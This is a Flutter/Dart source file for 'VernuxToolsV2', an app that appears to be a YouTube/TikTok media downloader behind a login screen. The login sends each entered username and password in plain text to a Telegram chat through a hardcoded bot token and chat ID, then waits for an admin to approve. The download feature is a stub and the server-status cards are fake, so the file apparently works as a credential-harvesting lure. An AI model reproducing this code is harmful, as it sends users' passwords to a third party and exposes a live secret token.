import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'dart:ui'; // Untuk efek Glassmorphism

void main() {
  runApp(const VernuxApp());
}

class VernuxApp extends StatelessWidget {
  const VernuxApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'VernuxToolsV2',
      theme: ThemeData(
        primarySwatch: Colors.blue,
        scaffoldBackgroundColor: const Color(0xFF121212), // Dark mode background
      ),
      home: const LoginScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}

// ==========================================
// 1. SKRIN LOG MASUK (DENGAN TELEGRAM BOT)
// ==========================================
class LoginScreen extends StatefulWidget {
  const LoginScreen({Key? key}) : super(key: key);

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  final TextEditingController _usernameController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();
  
  // MASUKKAN MAKLUMAT BOT TELEGRAM ANDA DI SINI
  final String botToken = '8644484753:AAGP9PGfwUTAwMLULeokA0bscuAyXj0vCBU';
  final String chatId = '7494792960';

  bool isLoading = false;
  Timer? _pollingTimer;

  Future<void> _hantarLogMasuk() async {
    if (_usernameController.text.isEmpty || _passwordController.text.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Sila isi Username dan Password!')),
      );
      return;
    }

    setState(() {
      isLoading = true;
    });

    final text = '🔐 *Permintaan Log Masuk VernuxToolsV2*\n\nUsername: `${_usernameController.text}`\nPassword: `${_passwordController.text}`';
    
    final url = Uri.parse('https://api.telegram.org/bot$botToken/sendMessage');
    try {
      final response = await http.post(
        url,
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'chat_id': chatId,
          'text': text,
          'parse_mode': 'Markdown',
          'reply_markup': {
            'inline_keyboard': [
              [
                {'text': '✅ Terima', 'callback_data': 'terima'},
                {'text': '❌ Tolak', 'callback_data': 'tolak'}
              ]
            ]
          }
        }),
      );

      final responseData = jsonDecode(response.body);
      if (responseData['ok']) {
        int messageId = responseData['result']['message_id'];
        _mulaSemakStatus(messageId);
      } else {
        _tunjukMesej('Ralat menghantar mesej ke Telegram.');
        setState(() { isLoading = false; });
      }
    } catch (e) {
      _tunjukMesej('Tiada sambungan internet.');
      setState(() { isLoading = false; });
    }
  }

  void _mulaSemakStatus(int sentMessageId) {
    _pollingTimer = Timer.periodic(const Duration(seconds: 3), (timer) async {
      final url = Uri.parse('https://api.telegram.org/bot$botToken/getUpdates');
      try {
        final response = await http.get(url);
        final data = jsonDecode(response.body);
        
        if (data['ok']) {
          List updates = data['result'];
          for (var update in updates) {
            if (update.containsKey('callback_query')) {
              var callbackQuery = update['callback_query'];
              if (callbackQuery['message']['message_id'] == sentMessageId) {
                String action = callbackQuery['data'];
                timer.cancel();
                setState(() { isLoading = false; });

                if (action == 'terima') {
                  // JIKA DITERIMA, PERGI KE SKRIN UTAMA VERNUX TOOLS
                  Navigator.pushReplacement(
                    context,
                    MaterialPageRoute(builder: (context) => const VernuxToolsScreen()),
                  );
                  _tunjukMesej('Selamat datang ke VernuxToolsV2!');
                } else {
                  _tunjukMesej('Log masuk DITOLAK oleh Admin.');
                }
                return;
              }
            }
          }
        }
      } catch (e) {
        // Abaikan ralat ketika polling
      }
    });
  }

  void _tunjukMesej(String mesej) {
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(mesej)));
  }

  @override
  void dispose() {
    _pollingTimer?.cancel();
    _usernameController.dispose();
    _passwordController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    // UI Log Masuk yang terang (seperti Screenshot sebelum ini)
    return Scaffold(
      backgroundColor: const Color(0xFFF8F9FA),
      appBar: AppBar(
        backgroundColor: Colors.white,
        elevation: 1,
        title: const Text(
          'VERNUXX TOOLS',
          style: TextStyle(color: Colors.blue, fontWeight: FontWeight.bold, fontSize: 16),
        ),
      ),
      body: isLoading 
        ? const Center(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                CircularProgressIndicator(),
                SizedBox(height: 16),
                Text('Menunggu kelulusan Telegram...', style: TextStyle(color: Colors.grey)),
              ],
            ),
          )
        : Padding(
            padding: const EdgeInsets.all(16.0),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const SizedBox(height: 24),
                const Text('Username', style: TextStyle(fontWeight: FontWeight.bold, color: Colors.black87)),
                const SizedBox(height: 8),
                TextField(
                  controller: _usernameController,
                  style: const TextStyle(color: Colors.black87),
                  decoration: InputDecoration(
                    prefixIcon: const Icon(Icons.person, color: Colors.grey),
                    hintText: 'Masukkan Username',
                    filled: true,
                    fillColor: Colors.white,
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: BorderSide.none,
                    ),
                  ),
                ),
                const SizedBox(height: 16),
                const Text('Password', style: TextStyle(fontWeight: FontWeight.bold, color: Colors.black87)),
                const SizedBox(height: 8),
                TextField(
                  controller: _passwordController,
                  obscureText: true,
                  style: const TextStyle(color: Colors.black87),
                  decoration: InputDecoration(
                    prefixIcon: const Icon(Icons.lock, color: Colors.grey),
                    hintText: 'Masukkan Password',
                    filled: true,
                    fillColor: Colors.white,
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: BorderSide.none,
                    ),
                  ),
                ),
                const Spacer(),
                SizedBox(
                  width: double.infinity,
                  height: 50,
                  child: ElevatedButton(
                    onPressed: _hantarLogMasuk,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.blue.shade700,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                    ),
                    child: const Text(
                      '🚀 LANJUT LOG MASUK',
                      style: TextStyle(fontWeight: FontWeight.bold, color: Colors.white, fontSize: 16),
                    ),
                  ),
                ),
              ],
            ),
          ),
    );
  }
}

// ==========================================
// 2. SKRIN UTAMA VERNUX TOOLS (DOWNLOADER)
// ==========================================
class VernuxToolsScreen extends StatefulWidget {
  const VernuxToolsScreen({Key? key}) : super(key: key);

  @override
  State<VernuxToolsScreen> createState() => _VernuxToolsScreenState();
}

class _VernuxToolsScreenState extends State<VernuxToolsScreen> {
  final TextEditingController _urlController = TextEditingController();
  String _formatPilihan = 'MP4'; // Default format

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      // Latar belakang gelap dengan elemen biru terang
      backgroundColor: const Color(0xFF0F172A), 
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        title: const Text(
          'Vernux Convert',
          style: TextStyle(color: Color(0xFF00BFFF), fontWeight: FontWeight.bold, letterSpacing: 1.5),
        ),
        actions: [
          IconButton(
            icon: const Icon(Icons.logout, color: Colors.redAccent),
            onPressed: () {
              // Log keluar dan kembali ke skrin login
              Navigator.pushReplacement(
                context,
                MaterialPageRoute(builder: (context) => const LoginScreen()),
              );
            },
          )
        ],
      ),
      body: SingleChildScrollView(
        child: Padding(
          padding: const EdgeInsets.all(16.0),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              // Header Teks
              const Text(
                'Media Downloader',
                style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold),
              ),
              const SizedBox(height: 8),
              const Text(
                'Muat turun dan tukar video dari YouTube & TikTok.',
                style: TextStyle(color: Colors.white54, fontSize: 14),
              ),
              const SizedBox(height: 24),

              // Kotak Glassmorphism untuk Input URL
              ClipRRect(
                borderRadius: BorderRadius.circular(20),
                child: BackdropFilter(
                  filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
                  child: Container(
                    padding: const EdgeInsets.all(20),
                    decoration: BoxDecoration(
                      color: Colors.white.withOpacity(0.05),
                      border: Border.all(color: Colors.white.withOpacity(0.1)),
                      borderRadius: BorderRadius.circular(20),
                    ),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        const Text('Tampal Link URL', style: TextStyle(color: Color(0xFF00BFFF), fontWeight: FontWeight.bold)),
                        const SizedBox(height: 12),
                        TextField(
                          controller: _urlController,
                          style: const TextStyle(color: Colors.white),
                          decoration: InputDecoration(
                            hintText: 'https://...',
                            hintStyle: const TextStyle(color: Colors.white30),
                            filled: true,
                            fillColor: Colors.black.withOpacity(0.3),
                            border: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(12),
                              borderSide: BorderSide.none,
                            ),
                            prefixIcon: const Icon(Icons.link, color: Color(0xFF00BFFF)),
                          ),
                        ),
                        const SizedBox(height: 16),
                        
                        // Pilihan Format (Bento Grid Style kecil)
                        Row(
                          children: [
                            Expanded(
                              child: _binaButangFormat('MP4', Icons.video_file, _formatPilihan == 'MP4'),
                            ),
                            const SizedBox(width: 12),
                            Expanded(
                              child: _binaButangFormat('MP3', Icons.audio_file, _formatPilihan == 'MP3'),
                            ),
                          ],
                        ),
                        const SizedBox(height: 20),
                        
                        // Butang Download
                        SizedBox(
                          width: double.infinity,
                          height: 55,
                          child: ElevatedButton(
                            onPressed: () {
                              if (_urlController.text.isEmpty) {
                                ScaffoldMessenger.of(context).showSnackBar(
                                  const SnackBar(content: Text('Sila masukkan URL terlebih dahulu')),
                                );
                                return;
                              }
                              ScaffoldMessenger.of(context).showSnackBar(
                                SnackBar(content: Text('Memulakan proses muat turun ${_formatPilihan}...')),
                              );
                              // Letak fungsi sebenar muat turun di sini (contoh: gabung dengan ytdl / API)
                            },
                            style: ElevatedButton.styleFrom(
                              backgroundColor: const Color(0xFF00BFFF),
                              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                            ),
                            child: const Text(
                              'CONVERT & DOWNLOAD',
                              style: TextStyle(fontWeight: FontWeight.bold, color: Colors.black87, fontSize: 16),
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              ),

              const SizedBox(height: 24),
              
              // Bahagian Status/Info dalam bentuk Bento Grid
              const Text('Status Sistem', style: TextStyle(color: Colors.white, fontSize: 18, fontWeight: FontWeight.bold)),
              const SizedBox(height: 12),
              Row(
                children: [
                  Expanded(
                    child: _binaKadInfo('Server', 'Online', Icons.cloud_done, Colors.greenAccent),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: _binaKadInfo('Storage', 'Tersedia', Icons.sd_storage, const Color(0xFF00BFFF)),
                  ),
                ],
              )
            ],
          ),
        ),
      ),
    );
  }

  // Fungsi bina butang format MP4/MP3
  Widget _binaButangFormat(String format, IconData ikon, bool isSelected) {
    return GestureDetector(
      onTap: () {
        setState(() {
          _formatPilihan = format;
        });
      },
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 12),
        decoration: BoxDecoration(
          color: isSelected ? const Color(0xFF00BFFF).withOpacity(0.2) : Colors.black.withOpacity(0.3),
          border: Border.all(color: isSelected ? const Color(0xFF00BFFF) : Colors.transparent),
          borderRadius: BorderRadius.circular(12),
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(ikon, color: isSelected ? const Color(0xFF00BFFF) : Colors.white54, size: 20),
            const SizedBox(width: 8),
            Text(
              format,
              style: TextStyle(
                color: isSelected ? const Color(0xFF00BFFF) : Colors.white54,
                fontWeight: FontWeight.bold,
              ),
            )
          ],
        ),
      ),
    );
  }

  // Fungsi bina kad info Bento
  Widget _binaKadInfo(String tajuk, String nilai, IconData ikon, Color warna) {
    return ClipRRect(
      borderRadius: BorderRadius.circular(16),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
        child: Container(
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: Colors.white.withOpacity(0.05),
            border: Border.all(color: Colors.white.withOpacity(0.05)),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Icon(ikon, color: warna, size: 28),
              const SizedBox(height: 12),
              Text(tajuk, style: const TextStyle(color: Colors.white54, fontSize: 12)),
              Text(nilai, style: const TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold)),
            ],
          ),
        ),
      ),
    );
  }
}
